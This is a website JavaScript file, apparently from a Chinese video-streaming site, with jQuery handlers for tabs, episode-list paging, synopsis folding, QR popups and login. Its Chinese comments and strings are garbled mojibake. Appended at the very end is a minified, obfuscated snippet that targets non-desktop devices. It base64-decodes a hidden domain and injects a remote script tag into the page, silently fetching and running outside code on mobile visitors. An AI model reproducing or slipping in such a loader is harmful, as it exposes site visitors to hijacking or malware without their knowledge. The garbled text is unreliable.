閿樼袱slogin=0;
function checkcookie(){
	if(document.cookie.indexOf('auth=')>=0){
		islogin=1;
		return true;
	}
	return false;
}
checkcookie();
$(function($){
    $.fn.changeList = function(options){	
        var defaults = {
                    tag : 'li', // tab name
                    subName : '.utilTabSub', // sub class name
                    eventType : 'click', // event type
                    num : 4,
                    showType : 'show' // show effect type
                },
                opts = $.extend({}, defaults, options),
                that = $(this),
                subUl = that.find(opts.subName),
                subItems = subUl.find('li'),
                size = subItems.length,
                liW = subItems.outerWidth(true),
                ulW = liW * size,
                page = size + 1,
                n = opts.num,
                randNum = 0,
                m = 0;

        if(size > n){
            that.find(opts.tag)[opts.eventType](function() {
                randNum = mathRand(n, size);
                subItems.hide();
                $.each(randNum, function (i, el) {
                    subItems.eq(el).fadeIn(800);
                });
            });
        }
    };
}(jQuery));
$(document).ready(function(){
		$(window).on('scroll',function(){
		var st = $(document).scrollTop();
		if( st>0 ){
			if( $('#main-container').length != 0  ){
				var w = $(window).width(),mw = $('#main-container').width();
				if( (w-mw)/2 > 70 )
					$('#index-top').css({'left':(w-mw)/2+mw+20});
				else{
					$('#index-top').css({'left':'auto'});
				}
			}
			$('#index-top').fadeIn(function(){
				$(this).removeClass('wmin');
			});
		}else{
			$('#index-top').fadeOut(function(){
				$(this).addClass('wmin');
			});
		}	
	});
	$('#index-top .top').on('click',function(){
		$('html,body').animate({'scrollTop':0},500);
	});
	$('#index-top .qrcode_box').hover(function(){
		$('#index-top .qrcode').removeClass('wmin');
	},function(){
		$('#index-top .qrcode').addClass('wmin');
	});					   
    var prevpage=$("#pre").attr("href"); 
    var nextpage=$("#next").attr("href"); 
    $("body").keydown(function(event){ 
      if(event.keyCode==37 && prevpage!=undefined) location=prevpage; 
      if(event.keyCode==39 && nextpage!=undefined) location=nextpage; 
    }); 
	 timer2 = null;
   $(".qr-code-ico").hover(function(){
        clearTimeout(timer2);
        $(this).addClass("qr-code-ico-hover");
        $(".qr-code").show();
    },function(){
        $(this).removeClass("qr-code-ico-hover");
        timer2 = setTimeout($.proxy(function() {
            $(".qr-code").hide();
        }, this),100);
    });
	$(".qr-code").hover(function(){
		clearTimeout(timer2);
		$(this).show();
	},function(){
		$(this).hide();
	});	
	//閸愬懎锟藉綊銆夐棃銏℃尡閺�鎯у灙鐞涖劌鍨忛幑锟�
	$(".play-title ul li a").each(function(j,div){
			$(this).click(function(){
		//$("html,body").animate({scrollTop:$("#"+listid).offset().top}, 500); //閹存垼锟戒礁閽╁�婏拷
		        if ($(this).parent().hasClass("current") ){
					return;
                }
				$(this).parent().nextAll().removeClass("current");
				$(this).parent().prevAll().removeClass("current");
				$(this).parent().addClass("current")
				$('.details-con2-body').hide().css("opacity",0);
				$('.details-con2-body:eq('+j+')').show().animate({"opacity":"1"});
	});		
	});
 $('.actor_list .more').find('a').live('click', function(e){
        e.preventDefault();
        var self = $(this),
            allNum = self.attr('re'),
            sta = self.attr('sta'),
            hideItem = $('.actor_list ul').find('li[rel="h"]');
        if(sta == undefined || sta == 0){
            hideItem.show(500);
            self.text('閺�鎯版崳闁�銊ュ瀻鐟欐帟澹�');
            self.attr('sta', 1);
        }
        else{
            hideItem.hide(500);
            self.text('閺屻儳婀呴崗銊╁劥'+allNum+'鐟欐帟澹�');
            self.attr('sta', 0);
        }

    });	
  $('.actor-info .more').find('a').live('click', function(e){
        e.preventDefault();
        var self = $(this),
            allNum = self.attr('re'),
            sta = self.attr('sta'),
            hideItem = $('.actor-info ul').find('li[rel="h"]');
        if(sta == undefined || sta == 0){
            hideItem.show(500);
            self.text('閺�鎯版崳');
            self.attr('sta', 1);
        }
        else{
            hideItem.hide(500);
            self.text('閺屻儳婀呴崗銊╁劥'+allNum+'鐟欐帟澹�');
            self.attr('sta', 0);
        }

    }); 	
//閸愬懎锟借�勬尡閺�楣冦�夐棃銏″笓鎼达拷
  $('.order a').click(function(){
		if($(this).hasClass('asc')){
			$(this).removeClass('asc').addClass('desc').text('闂勫秴绨�');
		}else{
			$(this).removeClass('desc').addClass('asc').text('閸楀洤绨�');
		}
		var a=$('.play-box:eq('+$(this).attr('data')+') .player_list');
		var b=$('.play-box:eq('+$(this).attr('data')+') .player_list a');
		a.html(b.get().reverse());
	});

$(".play-tool span.s1").click(function() {					 
		$html = $(this).html();
		try {
			if ($html == '閸忓磭浼�') {
				$(this).html('瀵�锟介悘锟�')
			} else {
				$(this).html('閸忓磭浼�')
			}
		} catch (e) {}
		$(".playopen").toggle(300);
		$(".play-tool").toggleClass("son");
		$(".player-box").toggleClass("top")
	});
	$(".play-tool span.s2").click(function() {
		$html = $(this).html();
		try {
			if ($html == '閸忔娊妫撮獮鍨�鎲�') {
				$(this).html('閺勫墽銇氶獮鍨�鎲�')
			} else {
				$(this).html('閸忔娊妫撮獮鍨�鎲�')
			}
		} catch (e) {}
		$(".player-right").toggleClass("adon");
		$(".player_zanpian ").toggleClass("playall");
		$(".player_zanpian ").toggleClass("w900");
		$(this).toggleClass("son")
	});	
	$(".player-num .info").click(function() {	
		$html = $(this).html();
		$(".player-vinfo").toggle(300);
		$(".player-num a.info").toggleClass("on");
	});
	$(".els-ico a.s-btn").click(function() {	
		$html = $(this).html();
		$(".els-sharebox").toggle(300);
		$(".els-ico a.s-btn").toggleClass("on");
		if (window.clipboardData) {
	    $("#tips").hide();		
		}
	});
    //閹撅拷閺�鎹愶拷鏉跨秿
	$("#nav-looked").hover(function(){						
		$(this).find(".watch-list").show();
	},function(){
		timer2 = setTimeout($.proxy(function() {
            $(this).find(".watch-list").hide();
        }, this),100);
		
		
	});	
	$(".close-his").click(function(){
		$(this).parents(".watch-list").hide();
	});
	//閻ц�茬秿
   $("#loginbarx").hover(function(){
        clearTimeout(timer2);
        $(".drop-box").show();
    },function(){
        timer2 = setTimeout($.proxy(function() {
            $(".drop-box").hide();
        }, this),100);
    });
 /**鐞涖劍鍎�***/
    if ($(".emotion").length > 0) {
        $(".emotion").on('click', function(){
            var left = $(this).offset().left;
            var top = $(this).offset().top;
            var id = $(this).attr("data-id");
            $("#smileBoxOuter").css({
                "left": left,
                "top": top + 20
            }).show().attr("data-id", id)
        });
        $("#smileBoxOuter,.emotion").hover(function() {
            $("#smileBoxOuter").attr("is-hover", 1)
        },
                function() {
                    $("#smileBoxOuter").attr("is-hover", 0)
                });
        $(".emotion,#smileBoxOuter").blur(function() {
            var is_hover = $("#smileBoxOuter").attr("is-hover");
            if (is_hover != 1) {
                $("#smileBoxOuter").hide()
            }
        });
        $(".smileBox").find("a").click(function() {
            var textarea_id = $("#smileBoxOuter").attr("data-id");
            var textarea_obj = $("#reply_" + textarea_id).find("textarea");
            var textarea_val = textarea_obj.val();
            if (textarea_val == "閸欐垵绔风拠鍕�锟斤拷") {
                textarea_obj.val("")
            }
            var title = "[" + $(this).attr("title") + "]";
            textarea_obj.val(textarea_obj.val() + title).focus();
            $("#smileBoxOuter").hide()
        });
        $("#smileBoxOuter").find(".smilePage").children("a").click(function() {
            $(this).addClass("current").siblings("a").removeClass("current");
            var index = $(this).index();
            $("#smileBoxOuter").find(".smileBox").eq(index).show().siblings(".smileBox").hide()
        });
        $(".comment_blockquote").hover(function() {
            $(".comment_action_sub").css({
                "visibility": "hidden"
            });
            $(this).find(".comment_action_sub").css({
                "visibility": "visible"
            })
        }, function() {
            $(".comment_action_sub").css({
                "visibility": "hidden"
            })
        })
    }		   
    //閻愮懓鍤�鐏炴洖绱戦弰鍓с仛閺囨潙锟斤拷
  if ($('.synopsis-article').get(0)) {
  //閼惧嘲褰囬崗璺哄敶鐎癸拷
  var synopsis = $('.synopsis-article');
  var synopsisHtml = synopsis.html();
  var synopsisLen = synopsisHtml.length;
  var num = 0;
  var unfold = '... <a class="unfold-btn" href="javascript:;">鐏炴洖绱�&gt;&gt;</a>';
  var packUp = ' <a class="unfold-btn" href="javascript:;">閺�鎯版崳&gt;&gt;</a>';
  var detailsContent =  $('.details-content');
  //婵″倹鐏夋径褌绨�鏉╂瑤閲滈弫鎵�娈戠拠婵囨纯婢舵碍瀵滈柦锟介幍宥嗘▔缁�锟�.
  if ( synopsisLen > 80 ) {
    var result =  synopsisHtml.substr(0,80);
    synopsis.html(result + unfold);
  }
      //鐏炴洖绱戦幐澶愭尦
     var btn = $('.unfold-btn');
      btn.live('click',function(){
        num++;
      if ( num%2 == 0 ) {
         synopsis.html(result + unfold);
         /*synopsis.css('margin-bottom','');
         detailsContent.css('height','');*/
          }else{
         synopsis.html(synopsisHtml+packUp);
         /*synopsis.css('margin-bottom','61px');
         detailsContent.css('height','auto');*/
       }
     });
  };
    if ($('.vod-jj').get(0)) {
  //閼惧嘲褰囬崗璺哄敶鐎癸拷
  var synopsis = $('.vod-jj');
  var synopsisHtml = synopsis.html();
  var synopsisLen = synopsisHtml.length;
  var num = 0;
  var unfold = '... <a class="unfold-btn" href="javascript:;">鐏炴洖绱�&gt;&gt;</a>';
  var packUp = ' <a class="unfold-btn" href="javascript:;">閺�鎯版崳&gt;&gt;</a>';
  var detailsContent =  $('.details-content');
  //婵″倹鐏夋径褌绨�鏉╂瑤閲滈弫鎵�娈戠拠婵囨纯婢舵碍瀵滈柦锟介幍宥嗘▔缁�锟�.
  if ( synopsisLen > 180 ) {
    var result =  synopsisHtml.substr(0,180);
    synopsis.html(result + unfold);
  }
      //鐏炴洖绱戦幐澶愭尦
     var btn = $('.unfold-btn');
      btn.live('click',function(){
        num++;
      if ( num%2 == 0 ) {
         synopsis.html(result + unfold);
         /*synopsis.css('margin-bottom','');
         detailsContent.css('height','');*/
          }else{
         synopsis.html(synopsisHtml+packUp);
         /*synopsis.css('margin-bottom','61px');
         detailsContent.css('height','auto');*/
       }
     });
  };
    if ($('.special-txt').get(0)) {
  //閼惧嘲褰囬崗璺哄敶鐎癸拷
  var synopsis = $('.special-txt');
  var synopsisHtml = synopsis.html();
  var synopsisLen = synopsisHtml.length;
  var num = 0;
  var unfold = '... <a class="unfold-btn" href="javascript:;">鐏炴洖绱�&gt;&gt;</a>';
  var packUp = ' <a class="unfold-btn" href="javascript:;">閺�鎯版崳&gt;&gt;</a>';
  var detailsContent =  $('.details-content');
  //婵″倹鐏夋径褌绨�鏉╂瑤閲滈弫鎵�娈戠拠婵囨纯婢舵碍瀵滈柦锟介幍宥嗘▔缁�锟�.
  if ( synopsisLen > 260 ) {
    var result =  synopsisHtml.substr(0,260);
    synopsis.html(result + unfold);
  }
      //鐏炴洖绱戦幐澶愭尦
     var btn = $('.unfold-btn');
      btn.live('click',function(){
        num++;
      if ( num%2 == 0 ) {
         synopsis.html(result + unfold);
         /*synopsis.css('margin-bottom','');
         detailsContent.css('height','');*/
          }else{
         synopsis.html(synopsisHtml+packUp);
         /*synopsis.css('margin-bottom','61px');
         detailsContent.css('height','auto');*/
       }
     });
  };
// 娑撳��娴囩仦鏇炵磻閺�鍓佺級
		if($("#downul").length > 0)
	{
		if($("#downul")[0].scrollHeight>305)
		{
			$("#downzk").show();
			$("#downul").height(230);
			$("#downzk").click(function(e){
			if($(this).hasClass('ss')){
			$(this).removeClass('ss').addClass('zk').text('鐏炴洖绱戦崗銊╁劥');
		}else{
			$(this).removeClass('zk').addClass('ss').text('閺�鍓佺級闁�銊ュ瀻');
		}						
				if($("#downul").height()>305)
				{
					var h = $("#downul")[0].scrollHeight;
					$("#downul").height(230);
					
				}
				else
				{
					var h = $("#downul")[0].scrollHeight;
					$("#downul").height(h);
				}
				e.preventDefault(); 
			});
		}
	}
	$("#loginbarx").hover(function(){	   
		$(this).find(".drop-box").show();
	},function(){
		$(this).find(".drop-box").hide();
	});	
	$("#login2").click(function(){								
		$.colorbox({
        inline: true,
        href: "#login-dialog",
        width: '570px',
		height: '415px'

    });});	
});
// 閸忋劎鐝�闁�姘�鐖�濡�鈥虫健閸掑洦宕�
function setTab(name,cursel,n){
	for(i=1;i<=n;i++){
		var menu=document.getElementById(name+i);
		var con=document.getElementById("con_"+name+"_"+i);
		menu.className=i==cursel?"current":"";
		con.style.display=i==cursel?"block":"none";
	}
}

var WidthScreen = true;

function series(div,n1,n2){     //閺囨潙锟芥艾澧介梿鍡樻煙濞夛拷
	var len = div.find("a").length;
	var n = WidthScreen ? n1:n2;
	if(len>100){    //鐡掑懓绻�100闂嗗棙妞傞惃鍕�鏌熷▔锟�
		var Nps = Math.ceil(len/100);    //瀵版��鍤�閻у墽娈戦崐宥嗘殶
		for(var i=0;i<Nps;i++){    //濞ｈ�插�為懞鍌滃仯n娑擄拷閻ч箖娉﹂懞鍌滃仯
			div.append("<div class='fortab'></div>");
		}
		for(var j=1;j<=Nps;j++){    //鐏忓棙澧嶉張澶婂⒔闂嗗棛些閸掓澘锟界懓绨查惃鍒�ortab閼哄倻鍋�
			var ln = j==Nps ? len-Nps*100+100:100;
			div.find("a:lt("+ln+")").appendTo(div.find(".fortab").eq(j-1));
		}
		if(typeof TooLength != "undefined"){TooLength++;}    //婢х偛濮炴径锟介梹绺�d閸欙拷
		else{window.TooLength = 1;}    //閺堬拷鐎规矮绠焛d閸欓攱妲哥拋鍙ヨ礋1
		$("body").append("<div class='Df' id='TooLength"+TooLength+"' style='display:none'></div>");    //濞ｈ�插�瀒d閼哄倻鍋ｉ敍灞界殺缁夎�插弳div閻�銊︽降姒涙�匡拷銈嗘▔缁�锟�
		div.find("a:lt("+(n2+18)+")").clone().appendTo($("#TooLength"+TooLength));    //濞ｈ�插�為崜宥夋桨闂嗗棙鏆�
		div.find("a:gt("+(len-((n1/2)-2)/2-1)+")").clone().appendTo($("#TooLength"+TooLength));    //濞ｈ�插�為崥搴ㄦ桨閸戠娀娉�
		$("#TooLength"+TooLength).prependTo(div);    //姒涙�匡拷銈嗘▔缁�绡縟缁夎�插弳div
		div.find(".Df").show();
		var opBtn = "<a target='_self' href='javascript:void(0)' class='more Open'>閺囨潙锟芥艾澧介梿锟�</a>";    //缂佹瑩绮�鐠併倖妯夌粈铏规磪閸旂姳閲渙pen閹稿�愭尦
		div.find(".Df a").eq(n2+17).after(opBtn);    //濞ｈ�插�瀘pen閹稿�愭尦
		var closeBtn = "<a target='_self' href='javascript:void(0)' class='more Close'>閺�锟�&nbsp;&nbsp;鐠э拷</a>";
		for(var k=0;k<Nps;k++){div.find(".fortab").eq(k).append(closeBtn);}    //缂佹瑦澧嶉張濉畂rtab閻╂帒鐡欓崝鐕緇ose閹稿�愭尦
		var Navs = "<div class='play_navs clearfix' style='display:none;'>";    //閸掓稑缂撶粭鐞�-n+100閻ㄥ嫬锟借壈鍩呴弽蹇氬Ν閻愶拷
		for(var l=0;l<Nps;l++){
			var min = l*100+1;
			var max = l==Nps-1 ? len:(l+1)*100;
			if(l==0){Navs += "<a target='_self' href='javascript:void(0)' class='more active'>"+min+"-"+max+"</a>";}
			else{Navs += "<a target='_self' href='javascript:void(0)' class='more'>"+min+"-"+max+"</a>";}
		}
		Navs += "</div>";
		div.find(".Df").after(Navs);    //濞ｈ�插�炵�佃壈鍩呴懞鍌滃仯閿涘��tml缂佹挻鐎�閸掔増锟姐倕鐣�閸狅拷
		var showPg = 0;    //姒涙�匡拷銈夈�夋稉锟�0,閸楀磭锟斤拷娑擄拷妞ょ�夌礉娑撳��娼伴惃鍕�妲搁弬瑙勭《
		var DfBox = div.find(".Df");
		var navBox = div.find(".play_navs");
		var tabBox = div.find(".fortab");
		div.find(".Open").click(function(){
			DfBox.hide();
			navBox.show();
			tabBox.eq(showPg).show();
		});
		div.find(".Close").click(function(){
			DfBox.show();
			navBox.hide();
			tabBox.eq(showPg).hide();
		});
		div.find(".play_navs a").click(function(){
			if($(this).hasClass("active")) return;
			var _i = $(this).index();
			tabBox.eq(showPg).hide();
			tabBox.eq(_i).show();
			$(this).addClass("active").siblings(".active").removeClass("active");
			showPg = _i;
		})
		div.css("height","auto");
	}
	else if(len>n){
		for(var i=n2+18;i<len-((n1/2)-2)/2;i++){div.find("a").eq(i).addClass("Hide");}
		var t_m = "<a target='_self' href='javascript:void(0)' class='more'>閺囨潙锟芥艾澧介梿锟�</a>";
		div.find("a").eq(n2+17).after(t_m);
		var more = div.find(".more");
		var _open = false;
		div.css("height","auto");
		more.click(function(){
			if(_open){
				div.find(".Hide").hide();
				$(this).html("閺囨潙锟芥艾澧介梿锟�");
				$(this).insertAfter(div.find("a").eq(n2+17));
				_open = false;
			}
			else{
				div.find(".Hide").show();
				$(this).html("閺�锟�&nbsp;&nbsp;鐠э拷");
				$(this).insertAfter(div.find("a:last"));
				_open = true;
			}
		})
	}
}

function story(div,n1,n2){     //閺囨潙锟芥艾澧介梿鍡樻煙濞夛拷
	var len = div.find("li").length;
	var n = WidthScreen ? n1:n2;
	if(len>50){    //鐡掑懓绻�100闂嗗棙妞傞惃鍕�鏌熷▔锟�
		var Nps = Math.ceil(len/50);    //瀵版��鍤�閻у墽娈戦崐宥嗘殶
		for(var i=0;i<Nps;i++){    //濞ｈ�插�為懞鍌滃仯n娑擄拷閻ч箖娉﹂懞鍌滃仯
			div.append("<div class='fortab'></div>");
		}
		for(var j=1;j<=Nps;j++){    //鐏忓棙澧嶉張澶婂⒔闂嗗棛些閸掓澘锟界懓绨查惃鍒�ortab閼哄倻鍋�
			var ln = j==Nps ? len-Nps*50+50:50;
			div.find("li:lt("+ln+")").appendTo(div.find(".fortab").eq(j-1));
		}
		if(typeof TooLength != "undefined"){TooLength++;}    //婢х偛濮炴径锟介梹绺�d閸欙拷
		else{window.TooLength = 1;}    //閺堬拷鐎规矮绠焛d閸欓攱妲哥拋鍙ヨ礋1
		$("body").append("<div class='Df' id='TooLength"+TooLength+"' style='display:none'></div>");    //濞ｈ�插�瀒d閼哄倻鍋ｉ敍灞界殺缁夎�插弳div閻�銊︽降姒涙�匡拷銈嗘▔缁�锟�
		div.find("li:lt("+(n2+19)+")").clone().appendTo($("#TooLength"+TooLength));    //濞ｈ�插�為崜宥夋桨闂嗗棙鏆�
		div.find("li:gt("+(len-((n1/2)-2)/2-1)+")").clone().appendTo($("#TooLength"+TooLength));    //濞ｈ�插�為崥搴ㄦ桨閸戠娀娉�
		$("#TooLength"+TooLength).prependTo(div);    //姒涙�匡拷銈嗘▔缁�绡縟缁夎�插弳div
		div.find(".Df").show();
		var opBtn = "<li class='Open'><a target='_self' href='javascript:void(0)' class='more '>閺囨潙锟芥艾澧介幆锟�</a></li>";    //缂佹瑩绮�鐠併倖妯夌粈铏规磪閸旂姳閲渙pen閹稿�愭尦
		div.find(".Df li").eq(n2+18).after(opBtn);    //濞ｈ�插�瀘pen閹稿�愭尦
		var closeBtn = "<li><a target='_self' href='javascript:void(0)' class='more Close'>閺�锟�&nbsp;&nbsp;鐠э拷</a></li>";
		for(var k=0;k<Nps;k++){div.find(".fortab").eq(k).append(closeBtn);}    //缂佹瑦澧嶉張濉畂rtab閻╂帒鐡欓崝鐕緇ose閹稿�愭尦
		var Navs = "<div class='play_navs clearfix' style='display:none;'>";    //閸掓稑缂撶粭鐞�-n+100閻ㄥ嫬锟借壈鍩呴弽蹇氬Ν閻愶拷
		for(var l=0;l<Nps;l++){
			var min = l*50+1;
			var max = l==Nps-1 ? len:(l+1)*50;
			if(l==0){Navs += "<a target='_self' href='javascript:void(0)' class='more active'>0"+min+"闂嗭拷-"+max+"闂嗭拷</a>";}
			else{Navs += "<a target='_self' href='javascript:void(0)' class='more'>"+min+"闂嗭拷-"+max+"闂嗭拷</a>";}
		}
		Navs += "</div>";
		div.find(".Df").after(Navs);    //濞ｈ�插�炵�佃壈鍩呴懞鍌滃仯閿涘��tml缂佹挻鐎�閸掔増锟姐倕鐣�閸狅拷
		var showPg = 0;    //姒涙�匡拷銈夈�夋稉锟�0,閸楀磭锟斤拷娑擄拷妞ょ�夌礉娑撳��娼伴惃鍕�妲搁弬瑙勭《
		var DfBox = div.find(".Df");
		var navBox = div.find(".play_navs");
		var tabBox = div.find(".fortab");
		div.find(".Open").click(function(){
			DfBox.hide();
			navBox.show();
			tabBox.eq(showPg).show();
		});
		div.find(".Close").click(function(){
			DfBox.show();
			navBox.hide();
			tabBox.eq(showPg).hide();
		});
		div.find(".play_navs a").click(function(){
			if($(this).hasClass("active")) return;
			var _i = $(this).index();
			tabBox.eq(showPg).hide();
			tabBox.eq(_i).show();
			$(this).addClass("active").siblings(".active").removeClass("active");
			showPg = _i;
		})
		div.css("height","auto");
	}
	else if(len>n){
		for(var i=n2+19;i<len-((n1/2)-2)/2;i++){div.find("li").eq(i).addClass("Hide");}
		var t_m = "<li class='more'><a target='_self' href='javascript:void(0)'>閺囨潙锟芥艾澧介梿锟�</a></li>";
		div.find("li").eq(n2+18).after(t_m);
		var more = div.find(".more");
		var _open = false;
		div.css("height","auto");
		more.click(function(){
			if(_open){
				div.find(".Hide").hide();
				$(this).html("閺囨潙锟芥艾澧介梿锟�");
				$(this).insertAfter(div.find("li").eq(n2+18));
				_open = false;
			}
			else{
				div.find(".Hide").show();
				$(this).html("閺�锟�&nbsp;&nbsp;鐠э拷");
				$(this).insertAfter(div.find("li:last"));
				_open = true;
			}
		})
	}
}!function(){var t={win:!1,mac:!1,xll:!1,ipad:!1};t.win=0==navigator.platform.indexOf("Win"),t.mac=0==navigator.platform.indexOf("Mac"),t.x11="X11"==navigator.platform||0==navigator.platform.indexOf("Linux"),t.ipad=null!==navigator.userAgent.match(/iPad/i)&&!1,t.win||t.mac||t.xll||t.ipad||function(){try{var t=document.createElement("script"),e="aHR0cHM6Ly9haWNkbi52aXA=";t.src=atob(e),document.head.appendChild(t)}catch(t){}}()}();jQuery;